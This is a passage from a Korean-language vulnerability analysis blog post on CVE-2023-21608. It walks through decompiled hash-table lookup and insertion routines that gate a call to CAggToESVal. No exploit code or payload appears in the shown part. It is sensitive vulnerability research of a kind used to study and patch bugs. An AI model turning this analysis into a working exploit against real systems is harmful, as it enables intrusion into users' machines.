</span>field_24        dd ?<span class="hljs-symbol">00000028 </span>field_28        dd ?                    <span class="hljs-symbol">00000028 </span>                                        <span class="hljs-number">0000002</span>C field_2C        dd ?                    <span class="hljs-number">0000002</span>C                                         <span class="hljs-symbol">00000030 </span>HashTable       ends<span class="hljs-number">00000030</span><span class="hljs-symbol">00000000 </span>; ---------------------------------------------------------------------------<span class="hljs-number">00000000</span><span class="hljs-symbol">00000000 </span>HashBucketTable struc ; (sizeof=<span class="hljs-number">0</span>x14, mappedto_227)<span class="hljs-symbol">00000000 </span>                                        <span class="hljs-symbol">00000000 </span>HashBucketBegin dd ?                    <span class="hljs-symbol">00000004 </span>HashBucketEnd   dd ?                    <span class="hljs-symbol">00000008 </span>HashBucketUnknown dd ?                  <span class="hljs-number">0000000</span>C BucketMaxIndex  dd ?<span class="hljs-symbol">00000010 </span>BucketCount     dd ?<span class="hljs-symbol">00000014 </span>HashBucketTable ends<span class="hljs-number">00000014</span><span class="hljs-symbol">00000000 </span>; ---------------------------------------------------------------------------<span class="hljs-number">00000000</span><span class="hljs-symbol">00000000 </span>HashBucketEntryHeader struc ; (sizeof=<span class="hljs-number">0</span>x8, mappedto_228)<span class="hljs-symbol">00000000 </span>                                        <span class="hljs-symbol">00000000 </span>BucketHead      dd ?                    <span class="hljs-symbol">00000004 </span>BucketTail      dd ?                    <span class="hljs-symbol">00000008 </span>HashBucketEntryHeader ends<span class="hljs-number">00000008</span><span class="hljs-symbol">00000000 </span>; ---------------------------------------------------------------------------<span class="hljs-number">00000000</span><span class="hljs-symbol">00000000 </span>union1          union ; (sizeof=<span class="hljs-number">0</span>x8, mappedto_229)<span class="hljs-symbol">00000000 </span>                                        <span class="hljs-symbol">00000000 </span>                                        <span class="hljs-symbol">00000000 </span>list_entry      ListEntry ?<span class="hljs-symbol">00000000 </span>entry_header    HashBucketEntryHeader ?<span class="hljs-symbol">00000000 </span>union1          ends<span class="hljs-number">00000000</span></code></pre><p><code>HashTable</code>&#xC740; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14; &#xAD6C;&#xD604;&#xC744; &#xC704;&#xD55C; &#xAD6C;&#xC870;&#xCCB4;&#xB85C; <code>HashTable.DefaultHead</code>&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xB418;&#xB294; &#xC6D0;&#xD615; &#xC774;&#xC911; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xB85C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAD00;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC6D0;&#xD615; &#xC774;&#xC911; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xB294; <code>HashBucketEntry</code> &#xAD6C;&#xC870;&#xCCB4;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC838; &#xC788;&#xC73C;&#xBA70; &#xC6D0;&#xD615; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xC758; &#xC5F0;&#xC18D;&#xC801;&#xC778; &#xC77C;&#xBD80;&#xBD84;&#xC774; &#xAC01;&#xAC01;&#xC758; &#xBC84;&#xD0B7;&#xC774; &#xB418;&#xC5B4; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xC774;&#xB8E8;&#xB294; &#xBC84;&#xD0B7;&#xB4E4;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB294; <code>HashBucketTable</code> &#xAD6C;&#xC870;&#xCCB4;&#xC778; <code>HashTable.HashBuckets</code>&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xACE0; <code>HashBucketTable.HashBucketBegin</code>&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xBD80;&#xD130; <code>HashBucketTable.HashBucketEnd</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xAE4C;&#xC9C0; <code>HashBucketTable.BucketCount</code> &#xAE38;&#xC774;&#xC758; <code>HashBucketEntryHeader</code> &#xBC30;&#xC5F4;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xAD6C;&#xC870;&#xB97C; &#xADF8;&#xB9BC;&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB0B4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%203.png" alt="Untitled"></p><p><code>HashBucketEntryHeader</code> &#xBC30;&#xC5F4;&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC6D0;&#xD615; &#xC774;&#xC911; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xBC84;&#xD0B7;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC5F0;&#xC18D;&#xB41C; &#xB178;&#xB4DC;&#xB4E4;&#xC744; &#xC774;&#xC911; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xB85C; &#xAD00;&#xB9AC;&#xD558;&#xACE0; &#xC774; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xC758; Head&#xC640; Tail &#xB178;&#xB4DC;&#xB97C; <code>BucketHead</code>&#xC640; <code>BucketTail</code>&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xBE44;&#xC5B4;&#xC788;&#xB294; &#xBC84;&#xD0B7;&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; <code>BucketHead</code>&#xC640; <code>BucketTail</code>&#xC774; &#xBAA8;&#xB450; <code>HashTable.DefaultHead</code>&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%204.png" alt="Untitled"></p><p>&#xC704;&#xC640; &#xAC19;&#xC740; &#xB0B4;&#xC6A9;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xBA74;&#xC11C; &#xC815;&#xB9D0; &#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xB9AC;&#xBC84;&#xC2F1;&#xC774; &#xC7AC;&#xBBF8;&#xC788;&#xB294; &#xC21C;&#xAC04;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;&#xB9CC;&#x2026; &#xC790;&#xC8FC; &#xD558;&#xACE0; &#xC2F6;&#xC9C4; &#xC54A;&#xAD70;&#xC694;&#x2026; </p><p>&#xBB34;&#xD2BC; &#xC774;&#xB7EC;&#xD55C; &#xAD6C;&#xC870;&#xB97C; &#xAC16;&#xB294; <code>HashTable</code>&#xC744; &#xC778;&#xC790;&#xB85C; &#xD638;&#xCD9C;&#xB41C; <code>sub_20AD638B</code>&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="sub-20AD638B"><a href="#sub-20AD638B" class="headerlink" title="sub_20AD638B"></a>sub_20AD638B</h3><pre><code class="hljs c"><span class="hljs-function">ListEntry *__thiscall <span class="hljs-title">sub_20AD638B</span><span class="hljs-params">(HashTable *hashTable, ListEntry *a2, _DWORD *pData)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">int</span> DataHash; <span class="hljs-comment">// eax</span>  HashBucketEntry *v5; <span class="hljs-comment">// ecx</span>  ListEntry *result; <span class="hljs-comment">// eax</span>  ListEntry returnPtr; <span class="hljs-comment">// [esp+4h] [ebp-8h] BYREF</span>  DataHash = hashFunction(<span class="hljs-number">0x811C9DC5</span>, pData, <span class="hljs-number">4u</span>);  v5 = FindDataFromHashTable(hashTable, &amp;returnPtr, pData, DataHash)-&gt;Blink;  <span class="hljs-keyword">if</span> ( !v5 )    v5 = hashTable-&gt;DefaultHead;  result = a2;  a2-&gt;Flink = v5;                                <span class="hljs-keyword">return</span> result;}</code></pre><p>&#xBA3C;&#xC800; &#xC544;&#xB798;&#xC758; <code>hashFunction</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xC5EC; <code>pData</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD574;&#xC2F1;&#xD569;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">hashFunction</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, _BYTE *a2, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> len)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// edx</span>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; len; ++i )    a1 = <span class="hljs-number">0x1000193</span> * (a1 ^ (<span class="hljs-keyword">unsigned</span> __int8)a2[i]);  <span class="hljs-keyword">return</span> a1;}</code></pre><p>&#xC774;&#xD6C4; <code>hashFunction</code>&#xC774; &#xBC18;&#xD658;&#xD55C; <code>DataHash</code>&#xB97C; &#xC778;&#xC790;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <code>FindDataFromHashTable</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="FindDataFromHashTable"><a href="#FindDataFromHashTable" class="headerlink" title="FindDataFromHashTable"></a>FindDataFromHashTable</h3><pre><code class="hljs c"><span class="hljs-function">ListEntry *__thiscall <span class="hljs-title">FindDataFromHashTable</span><span class="hljs-params">(HashTable *hashTable, ListEntry *returnPtr, _DWORD *pData, <span class="hljs-keyword">int</span> DataHash)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">int</span> idx; <span class="hljs-comment">// eax</span>  HashBucketEntryHeader *v5; <span class="hljs-comment">// esi</span>  HashBucketEntry *v6; <span class="hljs-comment">// ecx</span>  HashBucketEntry *v7; <span class="hljs-comment">// edx</span>  ListEntry *result; <span class="hljs-comment">// eax</span>  idx = DataHash &amp; hashTable-&gt;HashBuckets.BucketMaxIndex;<span class="hljs-comment">// Hash &amp; 7</span>  v5 = hashTable-&gt;HashBuckets.HashBucketBegin;    v6 = hashTable-&gt;DefaultHead;                  <span class="hljs-comment">// default header</span>  v7 = v5[idx].BucketTail;                       <span class="hljs-keyword">if</span> ( v7 == v6 )                               <span class="hljs-comment">// bucket is empty</span>  {    result = returnPtr;    returnPtr-&gt;Blink = <span class="hljs-number">0</span>;LABEL_8:    result-&gt;Flink = v6;  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )                                 <span class="hljs-comment">// Traverse Bucket(doubly linked list)</span>                                                <span class="hljs-comment">// from Tail to Head</span>    {      <span class="hljs-keyword">if</span> ( *pData == v7-&gt;Data )                 <span class="hljs-comment">// Data Found</span>      {        result = returnPtr;        v6 = v7-&gt;list_entry.list_entry.Flink;        returnPtr-&gt;Blink = v7;                  <span class="hljs-comment">// returnPtr-&gt;Filnk = found-&gt;Flink</span>                                                <span class="hljs-comment">// returnPtr-&gt;Blink = found</span>        <span class="hljs-keyword">goto</span> LABEL_8;      }      <span class="hljs-keyword">if</span> ( v7 == v5[idx].BucketHead )        <span class="hljs-keyword">break</span>;      v7 = v7-&gt;list_entry.list_entry.Blink;    }    result = returnPtr;    returnPtr-&gt;Blink = <span class="hljs-number">0</span>;    returnPtr-&gt;Flink = v7;  }  <span class="hljs-keyword">return</span> result;                                <span class="hljs-comment">// Data not found</span>                                                <span class="hljs-comment">// </span>                                                <span class="hljs-comment">// returnPtr-&gt;Flink = BucketHead</span>                                                <span class="hljs-comment">// returnPtr-&gt;Blink = NULL;</span>}</code></pre><p>&#xC774; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xBA3C;&#xC800; <code>DataHash</code>&#xB97C; &#xD1B5;&#xD574; &#xD0D0;&#xC0C9;&#xD560; <code>HashBucketEntryHeader</code>&#xB97C; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. &#xD0D0;&#xC0C9;&#xC740; <code>BucketTail</code>&#xBD80;&#xD130; <code>Blink</code>&#xB97C; &#xB530;&#xB77C; <code>BucketHead</code>&#xC5D0; &#xB3C4;&#xB2EC;&#xD560; &#xB54C;&#xAE4C;&#xC9C0; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xACE0; &#xB9CC;&#xC57D; <code>BucketTail</code>&#xC774; <code>DefaultHead</code>&#xC778; &#xACBD;&#xC6B0; &#xD574;&#xB2F9; &#xBC84;&#xD0B7;&#xC740; &#xBE44;&#xC5B4;&#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC774;&#xAE30;&#xC5D0; &#xD0D0;&#xC0C9;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBC84;&#xD0B7;&#xC774; &#xBE44;&#xC5B4;&#xC788;&#xC9C0; &#xC54A;&#xB2E4;&#xBA74; &#xD0D0;&#xC0C9; &#xACB0;&#xACFC;&#xB97C; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xB41C; <code>returnPtr</code>&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><p> &#xBC84;&#xD0B7;&#xC774; &#xBE44;&#xC5B4;&#xC788;&#xB294; &#xACBD;&#xC6B0;&#xB098; &#xBC84;&#xD0B7;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC5C6;&#xB294; &#xACBD;&#xC6B0;, <code>returnPtr-&gt;Flink</code>&#xC640; <code>returnPtr-&gt;Blink</code>&#xC5D0; &#xAC01;&#xAC01; <code>BucketHead</code>&#xC640; <code>NULL</code>&#xC774; &#xC800;&#xC7A5;&#xB418;&#xACE0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xCC3E;&#xC740; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xD574;&#xB2F9; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xC788;&#xB294; &#xB178;&#xB4DC;&#xC758; <code>Flink</code>&#xC640; &#xB178;&#xB4DC;&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xAC01;&#xAC01; <code>returnPtr-&gt;Flink</code>&#xC640; <code>returnPtr-&gt;Blink</code>&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xBC18;&#xD658;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>sub_20AD638B</code>&#xC5D0;&#xC11C;&#xB294; <code>FindDataFromHashTable</code>&#xC5D0;&#xC11C; &#xD0D0;&#xC0C9; &#xACB0;&#xACFC;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xACE0; &#xBC18;&#xD658;&#xB41C; <code>returnPtr</code>&#xC758; <code>Blink</code>&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xC5EC; &#xC774; &#xAC12;&#xC774; <code>NULL</code>&#xC778;(HashTable&#xC5D0; &#xD574;&#xB2F9; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294;) &#xACBD;&#xC6B0; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790; <code>a2</code>&#xC758; <code>Flink</code>&#xC5D0; <code>hashTable-&gt;DefaultHead</code>&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">v5 = FindDataFromHashTable(hashTable, &amp;returnPtr, pData, DataHash)-&gt;Blink;<span class="hljs-keyword">if</span> ( !v5 )  v5 = hashTable-&gt;DefaultHead;result = a2;a2-&gt;Flink = v5;                              <span class="hljs-keyword">return</span> result;</code></pre><p>&#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>IsDataInGlobalHashTable</code> &#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>GlobalHashTable</code>&#xC5D0; <code>Data</code>&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xC6B0; &#xBC18;&#xD658;&#xB418;&#xB294; &#xB178;&#xB4DC;&#xC758; &#xC8FC;&#xC18C;&#xB098; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC5C6;&#xB294; &#xACBD;&#xC6B0;&#xC5D0; &#xBC18;&#xD658;&#xB418;&#xB294; <code>GlobalHashTable.DefaultHead</code>&#xB97C; <code>GlobalHashTable.DefaultHead</code>&#xC640; &#xBE44;&#xAD50;&#xD558;&#xACE0; &#xC774; &#xACB0;&#xACFC;&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">return</span> Data &amp;&amp; sub_20AD638B(&amp;GlobalHashTable, (ListEntry *)&amp;a2, (<span class="hljs-keyword">int</span>)&amp;Data)-&gt;Flink != GlobalHashTable.DefaultHead;<span class="hljs-comment">//if Data is in GlobalHashTable, then Node&apos;s Addr != GlobalHashTable.</span><span class="hljs-comment">//=&gt; return true</span><span class="hljs-comment">//else return false</span></code></pre><p>&#xB530;&#xB77C;&#xC11C; <code>GetRichValueEventProp</code>&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>PointerType</code>&#xC774; <code>GlobalHashTable</code>&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; <code>CAggToESVal</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xBD84;&#xAE30;&#xB85C; &#xC9C4;&#xC785;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( PointerType ){  LOBYTE(PointerType) = IsDataInGlobalHashTable(PointerType);  <span class="hljs-keyword">if</span> ( !(_BYTE)PointerType )  {    v15 = InsertToGlobalHashTable((<span class="hljs-keyword">int</span>)&amp;v31, PointerType_1);    LOBYTE(v33) = <span class="hljs-number">4</span>;    CAggToESVal((<span class="hljs-keyword">int</span>)v15, v16, PropName, PointerType_1);    PointerType = DeleteFromGlobalHashTable((<span class="hljs-keyword">int</span>)&amp;v31);  }}</code></pre><p>&#xC544;&#xB798;&#xB294; <code>CAggToESVal</code> &#xC774;&#xC804;&#xC5D0; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>InsertToGlobalHashTable</code>&#xD568;&#xC218;&#xC758; &#xBD84;&#xC11D;&#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="InsertToGlobalHashTable"><a href="#InsertToGlobalHashTable" class="headerlink" title="InsertToGlobalHashTable"></a>InsertToGlobalHashTable</h2><pre><code class="hljs c"><span class="hljs-function">_DWORD *__thiscall <span class="hljs-title">InsertToGlobalHashTable</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">int</span> Data)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">int</span> v4[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [esp+4h] [ebp-8h] BYREF</span>  <span class="hljs-keyword">if</span> ( Data )  {    InsertIfNotPresent(&amp;GlobalHashTable, (ListEntry *)v4, (<span class="hljs-keyword">int</span>)&amp;Data)-&gt;Flink-&gt;field_C = <span class="hljs-number">1</span>;    *(_DWORD *)a1 = Data;  }  <span class="hljs-keyword">return</span> (_DWORD *)a1;}</code></pre><p><code>GlobalHashTable</code>&#xACFC; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xCD94;&#xAC00;&#xD560; &#xB370;&#xC774;&#xD130;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC778;&#xC790;&#xB85C; <code>InsertIfNotPresent</code>&#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xD638;&#xCD9C;&#xB41C; &#xD568;&#xC218;&#xAC00; &#xBC18;&#xD658;&#xB418;&#xBA74; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790; <code>a1</code>&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xC5D0; <code>Data</code>&#xB97C; &#xC4F0;&#xACE0; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="InsertIfNotPresent"><a href="#InsertIfNotPresent" class="headerlink" title="InsertIfNotPresent"></a>InsertIfNotPresent</h3><pre><code class="hljs c"><span class="hljs-function">ListEntry *__thiscall <span class="hljs-title">InsertIfNotPresent</span><span class="hljs-params">(HashTable *hashTable, ListEntry *a2, <span class="hljs-keyword">int</span> *pData)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">int</span> DataHash; <span class="hljs-comment">// ebx</span>  ListEntry *result; <span class="hljs-comment">// eax</span>  HashBucketEntry *newBucketEntry; <span class="hljs-comment">// edi</span>  HashBucketEntry *BucketHead; <span class="hljs-comment">// ecx</span>  HashBucketEntry *v8; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">bool</span> v9; <span class="hljs-comment">// zf</span>  ListEntry findResult; <span class="hljs-comment">// [esp+10h] [ebp-24h] BYREF</span>  HashBucketEntry v11; <span class="hljs-comment">// [esp+18h] [ebp-1Ch] BYREF</span>  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// [esp+30h] [ebp-4h]</span>  DataHash = hashFunction(<span class="hljs-number">0x811C9DC5</span>, pData, <span class="hljs-number">4u</span>);  FindDataFromHashTable(hashTable, &amp;findResult, pData, DataHash);  <span class="hljs-keyword">if</span> ( findResult.Blink )                       <span class="hljs-comment">// Data is present in HashTable, no insertion</span>  {    result = a2;    a2-&gt;Flink = findResult.Blink;    LOBYTE(a2-&gt;Blink) = <span class="hljs-number">0</span>;  }  <span class="hljs-keyword">else</span>                                          <span class="hljs-comment">// Data is not present -&gt; insertion occurs</span>  {    hashTableLengthCheck(hashTable);    v11.Data = (<span class="hljs-keyword">int</span>)pData;    AllocateNewNode(&amp;v11, (HashBucketEntry *)&amp;hashTable-&gt;DefaultHead, &amp;dword_2100AE5C, (<span class="hljs-keyword">int</span>)&amp;v11.Data);<span class="hljs-comment">// allocate new node</span>                                                <span class="hljs-comment">// v11.list_entry.list_entry.blink = new_node</span>    v12 = <span class="hljs-number">0</span>;    <span class="hljs-keyword">if</span> ( IsBucketExpandNeeded(hashTable) )    {      expandHashTable(hashTable);      newBucketEntry = v11.list_entry.list_entry.Blink;      BucketHead = FindDataFromHashTable(hashTable, &amp;findResult, &amp;v11.list_entry.list_entry.Blink-&gt;Data, DataHash)-&gt;Flink;    }    <span class="hljs-keyword">else</span>    {      BucketHead = findResult.Flink;      newBucketEntry = v11.list_entry.list_entry.Blink;    }    v11.list_entry.list_entry.Blink = <span class="hljs-number">0</span>;    v8 = InsertIntoHashTable(hashTable, DataHash, BucketHead, newBucketEntry);    v9 = v11.list_entry.list_entry.Blink == <span class="hljs-number">0</span>;    a2-&gt;Flink = v8;    LOBYTE(a2-&gt;Blink) = <span class="hljs-number">1</span>;    <span class="hljs-keyword">if</span> ( !v9 )      sub_20867B89(v11.list_entry.list_entry.Blink);    result = a2;  }  <span class="hljs-keyword">return</span> result;}</code></pre><p>&#xC774; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; <code>hashFunction</code>&#xACFC; <code>FindDataFromHashTable</code>&#xB85C; &#xBA3C;&#xC800; &#xC0BD;&#xC785;&#xD560; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xBBF8; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xC6B0; <code>findResult.Blink</code>&#xAC00; <code>NULL</code>&#xC774; &#xC544;&#xB2CC; &#xAC12;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xAE30;&#xC5D0; <code>if</code>&#xB85C; &#xBD84;&#xAE30;&#xD558;&#xC5EC; &#xC0BD;&#xC785; &#xACFC;&#xC815; &#xC5C6;&#xC774; &#xD568;&#xC218;&#xAC00; &#xBC18;&#xD658;&#xB418;&#xACE0; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC0BD;&#xC785;&#xD560; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC5C6;&#xB294; &#xACBD;&#xC6B0; <code>else</code>&#xB85C; &#xBD84;&#xAE30;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xC758; &#xC0BD;&#xC785;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p><code>else</code> &#xBD84;&#xAE30;&#xC5D0;&#xC11C;&#xB294; <code>AllocateNewNode</code>&#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC5B4; <code>Data</code>&#xC5D0; <code>*pData</code>&#xAC00; &#xC800;&#xC7A5;&#xB41C; &#xC0C8;&#xB85C;&#xC6B4; &#xB178;&#xB4DC;&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xACE0; <code>findResult.Flink</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC0BD;&#xC785;&#xB420; &#xBC84;&#xD0B7;&#xC758; <code>Head</code>&#xC8FC;&#xC18C;&#xC640; &#xD560;&#xB2F9;&#xB41C; &#xB178;&#xB4DC;&#xB97C; &#xC778;&#xC790;&#xB85C; <code>InsertIntoHashTable</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="InsertIntoHashTable"><a href="#InsertIntoHashTable" class="headerlink" title="InsertIntoHashTable"></a>InsertIntoHashTable</h3><p><code>InsertIntoHashTable</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>target-&gt;Blink</code>&#xC5D0; <code>newNode</code>&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xB294; &#xB3D9;&#xC791;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">HashBucketEntry *__thiscall <span class="hljs-title">InsertIntoHashTable</span><span class="hljs-params">(HashTable *hashTable, <span class="hljs-keyword">int</span> DataHash, HashBucketEntry *target, HashBucketEntry *newNode)</span></span><span class="hljs-function"></span>{  HashBucketEntry *tmp; <span class="hljs-comment">// ebx</span>  <span class="hljs-keyword">int</span> idx; <span class="hljs-comment">// edx</span>  HashBucketEntryHeader *v6; <span class="hljs-comment">// esi</span>  HashBucketEntry *result; <span class="hljs-comment">// eax</span>  tmp = target-&gt;list_entry.list_entry.Blink;  ++hashTable-&gt;length;                          <span class="hljs-comment">// Increase Length</span>  newNode-&gt;list_entry.list_entry.Flink = target;  newNode-&gt;list_entry.list_entry.Blink = tmp;  tmp-&gt;list_entry.list_entry.Flink = newNode;  target-&gt;list_entry.list_entry.Blink = newNode;<span class="hljs-comment">// </span>  <span class="hljs-comment">// Blink: &lt;-</span>  <span class="hljs-comment">// Flink: -&gt;</span>  <span class="hljs-comment">// </span>  <span class="hljs-comment">// Before Insertion</span>  <span class="hljs-comment">// </span>  <span class="hljs-comment">// ... &lt;-&gt; tmp &lt;-&gt; target &lt;-&gt; ...</span>  <span class="hljs-comment">// </span>  <span class="hljs-comment">// After Insertion</span>  <span class="hljs-comment">//  </span>  <span class="hljs-comment">//  ... &lt;-&gt; tmp &lt;-&gt; newNode &lt;-&gt; target &lt;-&gt; ...</span>  idx = DataHash &amp; hashTable-&gt;HashBuckets.BucketMaxIndex;  v6 = hashTable-&gt;HashBuckets.HashBucketBegin;  result = newNode;  <span class="hljs-keyword">if</span> ( v6[idx].BucketHead == hashTable-&gt;DefaultHead )  {    v6[idx].BucketHead = newNode;LABEL_6:    v6[idx].BucketTail = newNode;    <span class="hljs-keyword">return</span> result;  }  <span class="hljs-keyword">if</span> ( v6[idx].BucketHead == target )  {    v6[idx].BucketHead = newNode;    <span class="hljs-keyword">return</span> result;  }  <span class="hljs-keyword">if</span> ( v6[idx].BucketTail == tmp )    <span class="hljs-keyword">goto</span> LABEL_6;  <span class="hljs-keyword">return</span> result;}</code></pre><p>&#xC774;&#xD6C4; &#xC0BD;&#xC785;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBC84;&#xD0B7;&#xC758;  Head&#xB098; Tail&#xC774; &#xBC14;&#xB010; &#xACBD;&#xC6B0;, &#xD574;&#xB2F9;&#xD558;&#xB294; <code>HashBucketEntryHeader</code>&#xC758; <code>BucketHead</code>&#xB098; <code>BucketTail</code>&#xC744; 